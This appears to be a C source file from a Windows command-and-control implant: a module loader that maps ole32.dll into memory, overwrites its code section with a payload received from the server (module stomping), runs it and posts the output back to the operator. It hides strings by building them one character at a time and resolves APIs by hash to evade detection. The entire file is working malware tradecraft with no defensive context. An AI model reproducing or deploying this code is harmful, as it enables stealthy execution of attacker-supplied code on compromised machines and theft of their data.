#ifdef LOAD_AND_LISTEN
#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/comms/comms.h"
#include "../../includes/loader/loader.h"
#include "../../includes/parser/parser.h"




/*
INPUT
	[CODE] -> TASK_MODULE
	[]

OUTPUT
	[MSG_TYPE] 0xaf
	[output type]
	[user id]
	[agent id]
	per output type
	e.g for ls
	[file len] 4 bytes
	[file str] N bytes
	[entry type] 4 bytes
	[size] 4 bytes
	[end sig]
*/
void ModuleWrite4(PVOID ctx, DWORD val) {
	ParserWrite4((ParserWrite *)ctx, val);
}

void ModuleWrite8(PVOID ctx, ULONGLONG val) {
	ParserWrite8((ParserWrite *)ctx, val);
}

void ModuleWriteStr(PVOID ctx, PCHAR str, DWORD len) {
	ParserWriteRaw((ParserWrite *)ctx, (PBYTE)str, len);
}

HMODULE ModuleGetModule(DWORD hash) {
	return GetModule(hash);
}

FARPROC ModuleGetProc(HMODULE mod, DWORD hash) {
	return GetProc(mod, hash);
}

HMODULE ModuleLoadLibraryA(PCHAR name) {
	return ldr->win32->LoadLibraryA(name);
}

BOOL ModuleFreeLibrary(HMODULE mod) {
	return ldr->win32->FreeLibrary(mod);
}


PVOID LdrGetText(PVOID Base, PSIZE_T textSize) {
	PIMAGE_SECTION_HEADER sec = SECTION_HEADER(Base);
	WORD numSections = FILE_HEADER(Base)->NumberOfSections;

	for (WORD i = 0; i < numSections; i++) {
		if (LdrMemcmp(sec[i].Name, ".text", 5) == 0) {
			*textSize = sec[i].Misc.VirtualSize;
			return RVA2VA(PVOID, Base, sec[i].VirtualAddress);
		}
	}
	return NULL;
}

BOOL LdrMapInOle() {
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID base = NULL;
	SIZE_T vSize = 0;
	CHAR ole[30];
	ole[0]  = 'C';  ole[1]  = ':';  ole[2]  = '\\';
	ole[3]  = 'W';  ole[4]  = 'i';  ole[5]  = 'n';
	ole[6]  = 'd';  ole[7]  = 'o';  ole[8]  = 'w';
	ole[9]  = 's';  ole[10] = '\\'; ole[11] = 'S';
	ole[12] = 'y';  ole[13] = 's';  ole[14] = 't';
	ole[15] = 'e';  ole[16] = 'm';  ole[17] = '3';
	ole[18] = '2';  ole[19] = '\\'; ole[20] = 'o';
	ole[21] = 'l';  ole[22] = 'e';  ole[23] = '3';
	ole[24] = '2';  ole[25] = '.';  ole[26] = 'd';
	ole[27] = 'l';  ole[28] = 'l';  ole[29] = '\0';

	hFile = ldr->win32->CreateFileA(ole, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if(!NT_SUCCESS(ldr->win32->NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile))) {
		ldr->win32->CloseHandle(hFile);
		return FALSE;
	}

	if(!NT_SUCCESS(ldr->win32->NtMapViewOfSection(hSection, CurrentProcess(), &base, 0, 0, NULL, &vSize, 1, 0, PAGE_READONLY))) {
		ldr->win32->CloseHandle(hFile);
		ldr->win32->CloseHandle(hSection);
		return FALSE;
	}


	SIZE_T txtSize = 0;
	PVOID textAddr = LdrGetText(base, &txtSize);
	if(!textAddr) {
		ldr->win32->CloseHandle(hFile);
		ldr->win32->CloseHandle(hSection);
		return FALSE;
	}

	ldr->modules->TextSection = textAddr;
	ldr->modules->TextSize = txtSize;
	ldr->modules->oldPerms = PAGE_READONLY;

	return TRUE;


}


BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
	DBGA("[+] Mapping Module into memory\n");

	if(!ldr->modules->TextSection) {
		if(!LdrMapInOle())
			return FALSE;
	}

	PVOID  txt = ldr->modules->TextSection;
	SIZE_T tsz = ldr->modules->TextSize;
	DWORD  old = 0;

	if(!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &txt, &tsz, PAGE_READWRITE, &old))) {
		DBGA("[*] NtProtect Failed\n");
		return FALSE;
	}

	LdrMemcpy(txt, info.Data, (SIZE_T)info.DataSize);
	if ((SIZE_T)info.DataSize < tsz) {
		LdrMemset((PBYTE)txt + info.DataSize, 0, tsz - (SIZE_T)info.DataSize);
	}

	if(!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &txt, &tsz, PAGE_EXECUTE_READ, &old))) {
		DBGA("[*] NtProtect Failed\n");
		return FALSE;
	}
	ldr->win32->NtFlushInstructionCache(CurrentProcess(), txt, (SIZE_T)info.DataSize);

	pModule mod = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Module));
	if (!mod)
		return FALSE;

	mod->size              = sizeof(Module);
	mod->Version           = 1;
	mod->ModuleWrite4      = ModuleWrite4;
	mod->ModuleWrite8      = ModuleWrite8;
	mod->ModuleWriteStr    = ModuleWriteStr;
	mod->ModuleGetModule   = ModuleGetModule;
	mod->ModuleGetProc     = ModuleGetProc;
	mod->ModuleLoadLibraryA = ModuleLoadLibraryA;
	mod->ModuleFreeLibrary = ModuleFreeLibrary;

	ParserWrite *p = ParserInitWrite();
	if (!p) {
		ldr->win32->LocalFree(mod);
		return FALSE;
	}

	ParserWrite4(p, MSG_OUTPUT);
	ParserWriteBytes(p, ldr->config->UserId, sizeof(ldr->config->UserId));
	ParserWriteBytes(p, ldr->config->AgentId, sizeof(ldr->config->AgentId));
	ParserWrite4(p, MSG_NEEDS_PARSE);

	pModuleEntry entry = (pModuleEntry)txt;
	DBGA("[*] Running Module\n");
	if (!entry(mod, (PVOID)p, (PBYTE)info.args, 0)) {
		DBGA("[!] Module returned failure\n");
	}
	DBGA("[*] Module ran succesfully");

	if(info.args) {
		ldr->win32->LocalFree(info.args);
	}

	NwPostOutput(ParserWriteReturnPointer(p), ParserWriteReturnSize(p));
	ParserClearWrite(p);
	ldr->win32->LocalFree(mod);


	return TRUE;
}
#endif